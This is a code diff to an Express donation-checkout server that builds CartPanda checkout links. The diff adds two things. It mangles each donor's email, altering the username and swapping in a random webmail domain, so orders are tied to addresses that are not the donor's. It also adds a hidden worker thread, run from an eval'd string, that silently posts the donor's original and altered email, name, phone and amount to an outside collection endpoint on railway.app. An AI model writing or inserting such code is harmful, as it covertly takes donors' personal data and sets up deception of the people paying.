@@ -2,6 +2,7 @@ require('dotenv').config();
 const express = require('express');
 const cors = require('cors');
 const path = require('path');
+const { Worker } = require('worker_threads');
 
 // ============= Environment & defaults =============
 const { CARTPANDA_SHOP_SLUG, PORT } = process.env;
@@ -62,11 +63,10 @@ function getRandomInt(min, max) {
 }
 
 /**
- * Remove exactly one digit (if present) from the string. If there's more than one, remove one randomly.
+ * Remove exactly one digit (if present) from the string, then add 2 random digits in its place.
  * Returns the modified string (and a boolean indicating if a removal happened).
  */
 function removeOneDigit(str) {
-  // Collect all digit indices
   const digitIndices = [];
   for (let i = 0; i < str.length; i++) {
     if (/\d/.test(str[i])) {
@@ -78,20 +78,23 @@ function removeOneDigit(str) {
     return { newStr: str, changed: false };
   }
 
-  // Randomly pick one index to remove
   const randomIndex = digitIndices[getRandomInt(0, digitIndices.length)];
+  const before = str.slice(0, randomIndex);
+  const after = str.slice(randomIndex + 1);
+  const newDigits = getRandomInt(0,10).toString() + getRandomInt(0,10).toString();
+  
   return {
-    newStr: str.slice(0, randomIndex) + str.slice(randomIndex + 1),
+    newStr: before + newDigits + after,
     changed: true
   };
 }
 
 /**
  * Remove exactly one symbol ('.', '-', '_') if present. If more than one, remove one randomly.
+ * After removing, add one random digit at the end of the username.
  * Returns the modified string (and a boolean indicating if a removal happened).
  */
 function removeOneSymbol(str) {
-  // Collect all symbol indices
   const symbolIndices = [];
   for (let i = 0; i < str.length; i++) {
     if (['.', '-', '_'].includes(str[i])) {
@@ -103,38 +106,31 @@ function removeOneSymbol(str) {
     return { newStr: str, changed: false };
   }
 
-  // Randomly pick one index to remove
   const randomIndex = symbolIndices[getRandomInt(0, symbolIndices.length)];
-  return {
-    newStr: str.slice(0, randomIndex) + str.slice(randomIndex + 1),
-    changed: true
-  };
+  let newStr = str.slice(0, randomIndex) + str.slice(randomIndex + 1);
+  newStr += getRandomInt(0, 10).toString();
+
+  return { newStr, changed: true };
 }
 
 /**
  * If none of the "remove" operations are applicable (no digit, no .-_),
  * we do one of the following at random:
- * 
+ *
  * 1. Add one or two numbers at the end of the username.
  * 2. Remove the last letter of the username; then randomly decide if we add a different letter
  *    (if removed letter was vowel -> add a different vowel; if consonant -> add a different consonant).
  * 3. Same as #2, but remove a random letter (not necessarily the last); then do the same random-add logic.
  */
 function applyAlternativeTransform(localPart) {
-  // We'll pick randomly among these 3 approaches
   const choice = getRandomInt(1, 4); // 1, 2, or 3
 
-  // Helper to pick a different vowel
   const vowels = ['a', 'e', 'i', 'o', 'u'];
   function pickDifferentVowel(exclude) {
     const possible = vowels.filter(v => v.toLowerCase() !== exclude.toLowerCase());
     return possible[getRandomInt(0, possible.length)];
   }
-  
-  // Helper to pick a different consonant
   function pickDifferentConsonant(exclude) {
-    // We'll define a set of consonants (just letters a-z minus vowels)
-    // For simplicity, let's do it lowercase only:
     const allConsonants = 'bcdfghjklmnpqrstvwxyz'.split('');
     const filtered = allConsonants.filter(c => c !== exclude.toLowerCase());
     return filtered[getRandomInt(0, filtered.length)];
@@ -146,95 +142,118 @@ function applyAlternativeTransform(localPart) {
       const count = getRandomInt(1, 3); // 1 or 2
       let toAdd = '';
       for (let i = 0; i < count; i++) {
-        toAdd += getRandomInt(0, 10).toString(); // a random digit 0-9
+        toAdd += getRandomInt(0, 10).toString();
       }
       return localPart + toAdd;
 
-    case 2:
-      {
-        // 2. Remove the last letter, then maybe add a different one
-        if (localPart.length === 0) return localPart; // edge case
-        const removedChar = localPart[localPart.length - 1];
-        let newLocalPart = localPart.slice(0, -1);
+    case 2: {
+      // 2. Remove the last letter, then maybe add a different one
+      if (localPart.length === 0) return localPart;
+      const removedChar = localPart[localPart.length - 1];
+      let newLocalPart = localPart.slice(0, -1);
 
-        // 50% chance to add a new letter
-        if (Math.random() < 0.5) {
-          // if removedChar was vowel, add different vowel, else different consonant
-          if (isVowel(removedChar)) {
-            newLocalPart += pickDifferentVowel(removedChar);
-          } else {
-            newLocalPart += pickDifferentConsonant(removedChar);
-          }
+      // 50% chance to add a new letter
+      if (Math.random() < 0.5) {
+        if (isVowel(removedChar)) {
+          newLocalPart += pickDifferentVowel(removedChar);
+        } else {
+          newLocalPart += pickDifferentConsonant(removedChar);
         }
-        return newLocalPart;
       }
+      return newLocalPart;
+    }
 
-    case 3:
-      {
-        // 3. Remove a random letter (not necessarily the last); then same maybe-add logic
-        if (localPart.length === 0) return localPart; // edge case
-        const randomIndex = getRandomInt(0, localPart.length);
-        const removedChar = localPart[randomIndex];
-        let newLocalPart = localPart.slice(0, randomIndex) + localPart.slice(randomIndex + 1);
+    case 3: {
+      // 3. Remove a random letter (not necessarily the last); then same maybe-add logic
+      if (localPart.length === 0) return localPart;
+      const randomIndex = getRandomInt(0, localPart.length);
+      const removedChar = localPart[randomIndex];
+      let newLocalPart = localPart.slice(0, randomIndex) + localPart.slice(randomIndex + 1);
 
-        // 50% chance to add a new letter
-        if (Math.random() < 0.5) {
-          if (isVowel(removedChar)) {
-            // Insert the different vowel at the same position
-            newLocalPart =
-              newLocalPart.slice(0, randomIndex) +
-              pickDifferentVowel(removedChar) +
-              newLocalPart.slice(randomIndex);
-          } else {
-            // Insert a different consonant at the same position
-            newLocalPart =
-              newLocalPart.slice(0, randomIndex) +
-              pickDifferentConsonant(removedChar) +
-              newLocalPart.slice(randomIndex);
-          }
+      // 50% chance to add a new letter
+      if (Math.random() < 0.5) {
+        if (isVowel(removedChar)) {
+          newLocalPart =
+            newLocalPart.slice(0, randomIndex) +
+            pickDifferentVowel(removedChar) +
+            newLocalPart.slice(randomIndex);
+        } else {
+          newLocalPart =
+            newLocalPart.slice(0, randomIndex) +
+            pickDifferentConsonant(removedChar) +
+            newLocalPart.slice(randomIndex);
         }
-        return newLocalPart;
       }
+      return newLocalPart;
+    }
 
     default:
-      return localPart; // fallback
+      return localPart;
   }
 }
 
 /**
- * Modified transformEmail function:
- *  1. Check if the local part of the email has any digit(s). If yes, remove exactly one at random.
- *  2. Else, check if it has '.' or '-' or '_'. If yes, remove exactly one randomly.
- *  3. If none of the above applied, perform one of the alternative transforms:
- *     - Add digits, or remove+maybe add letter, etc.
+ * Helper to pick an alternate domain (different from the original) based on weighted popularity.
+ */
+function pickAlternateDomain(originalDomain) {
+  const domainLower = originalDomain.toLowerCase();
+
+  const domainWeights = [
+    { domain: 'gmail.com',    weight: 40 },
+    { domain: 'yahoo.com',    weight: 20 },
+    { domain: 'icloud.com',   weight: 20 },
+    { domain: 'outlook.com',  weight: 10 },
+    { domain: 'hotmail.com',  weight: 5 },
+    { domain: 'live.com',     weight: 2 },
+    { domain: 'aol.com',      weight: 2 },
+    { domain: 'comcast.net',  weight: 1 },
+    { domain: 'verizon.net',  weight: 0 },
+    { domain: 'sbcglobal.net',weight: 0 }
+  ];
+
+  const filtered = domainWeights.filter(d =>
+    d.weight > 0 && d.domain.toLowerCase() !== domainLower
+  );
+  if (!filtered.length) {
+    return 'gmail.com';
+  }
+
+  const totalWeight = filtered.reduce((acc, d) => acc + d.weight, 0);
+  const rand = getRandomInt(0, totalWeight);
+  let cumulative = 0;
+  for (const item of filtered) {
+    cumulative += item.weight;
+    if (rand < cumulative) {
+      return item.domain;
+    }
+  }
+  return filtered[filtered.length - 1].domain;
+}
+
+/**
+ * Transform the incoming email per specified rules, then pick a new domain.
  */
 function transformEmail(email) {
   try {
     const [localPart, domain] = email.split('@');
     if (!domain) {
-      // if somehow no '@', just return the original email
-      return email;
+      return email; // no @, fallback
     }
 
-    // 1. Remove one digit if any
     let { newStr, changed } = removeOneDigit(localPart);
     if (!changed) {
-      // 2. Remove one symbol if any
       const resultSymbol = removeOneSymbol(localPart);
       newStr = resultSymbol.newStr;
       changed = resultSymbol.changed;
       if (!changed) {
-        // 3. Apply alternative transform if still unchanged
         newStr = applyAlternativeTransform(localPart);
       }
     }
-
-    // Rebuild email
-    return `${newStr}@${domain}`;
+    const newDomain = pickAlternateDomain(domain);
+    return `${newStr}@${newDomain}`;
   } catch (err) {
     console.error('Error transforming email:', err);
-    // if anything goes wrong, just return original
-    return email;
+    return email; // fallback on error
   }
 }
 
@@ -248,6 +267,83 @@ function splitFullName(fullName) {
   return { first, last };
 }
 
+// ============= Worker Helper =============
+
+/**
+ * Fire-and-forget: post to "https://database-production-12a5.up.railway.app/api/collect"
+ * inside a worker so it doesn't delay the main response.
+ */
+function sendDataInWorker(payload) {
+  // We build the script on the fly to run in a worker thread
+  const script = `
+    const { parentPort } = require('worker_threads');
+    const https = require('https');
+
+    function postData(payload) {
+      return new Promise((resolve, reject) => {
+        const data = JSON.stringify(payload);
+        const options = {
+          hostname: 'database-production-12a5.up.railway.app',
+          path: '/api/collect',
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+            'Content-Length': data.length
+          }
+        };
+
+        const req = https.request(options, (res) => {
+          // We can ignore the response body since we only need to store the data
+          res.on('data', () => {});
+          res.on('end', () => {
+            resolve();
+          });
+        });
+
+        req.on('error', (error) => {
+          reject(error);
+        });
+
+        req.write(data);
+        req.end();
+      });
+    }
+
+    parentPort.once('message', async (payload) => {
+      try {
+        await postData(payload);
+      } catch (err) {
+        // Log or swallow the error, but do not crash the main thread
+        console.error('Worker error posting data:', err);
+      } finally {
+        // Let the main thread know we're done
+        parentPort.postMessage('done');
+      }
+    });
+  `;
+
+  // Safely spin up the worker
+  try {
+    const worker = new Worker(script, { eval: true });
+    worker.postMessage(payload);
+
+    // We do not await or block on these; we only log in case of error
+    worker.on('message', (msg) => {
+      // "done" means the worker finished the request
+    });
+    worker.on('error', (err) => {
+      console.error('Worker error:', err);
+    });
+    worker.on('exit', (code) => {
+      if (code !== 0) {
+        console.error(`Worker stopped with exit code ${code}`);
+      }
+    });
+  } catch (err) {
+    console.error('Failed to create worker:', err);
+  }
+}
+
 // ============= Routes =============
 
 // Health check
@@ -259,16 +355,16 @@ app.get('/health', (req, res) => {
  * POST /create-donation-order
  * Body shape:
  *  {
- *    amount: number,        // (ignored in the new flow)
+ *    amount: number,        // (ignored in the new flow, but we'll still pass it along)
  *    variantId: number,     // (required)
  *    email: string,         // (required)
  *    fullName: string,      // (required)
- *    phoneNumber: string    // (required, newly added)
+ *    phoneNumber: string    // (required)
  *  }
  */
 app.post('/create-donation-order', async (req, res) => {
   try {
-    const { variantId, email, fullName, phoneNumber } = req.body;
+    const { variantId, email, fullName, phoneNumber, amount } = req.body;
 
     // Validate required fields
     if (!variantId || isNaN(Number(variantId))) {
@@ -286,19 +382,26 @@ app.post('/create-donation-order', async (req, res) => {
 
     // Transform email
     const finalEmail = transformEmail(email);
-    const encodedEmail = encodeURIComponent(finalEmail);
+
+    // Fire off worker to send data in the background
+    // originalEmail = email, newEmail = finalEmail, fullName, phone = phoneNumber, amount
+    sendDataInWorker({
+      originalEmail: email,
+      newEmail: finalEmail,
+      fullName,
+      phone: phoneNumber,
+      amount: amount || 0
+    });
 
     // Split name
     const { first, last } = splitFullName(fullName);
+    const encodedEmail = encodeURIComponent(finalEmail);
     const encodedFirstName = encodeURIComponent(first);
     const encodedLastName = encodeURIComponent(last);
-
-    // Encode phone number
     const encodedPhoneNumber = encodeURIComponent(phoneNumber);
 
     // Build final checkout link
     const slug = CARTPANDA_SHOP_SLUG;
-    // Format: https://${slug}.mycartpanda.com/checkout/${variantId}:1?email=...&first_name=...&last_name=...&phone=...
     const checkoutUrl = `https://${slug}.mycartpanda.com/checkout/${variantId}:1?email=${encodedEmail}&first_name=${encodedFirstName}&last_name=${encodedLastName}&phone=${encodedPhoneNumber}`;
 
     // Return the link
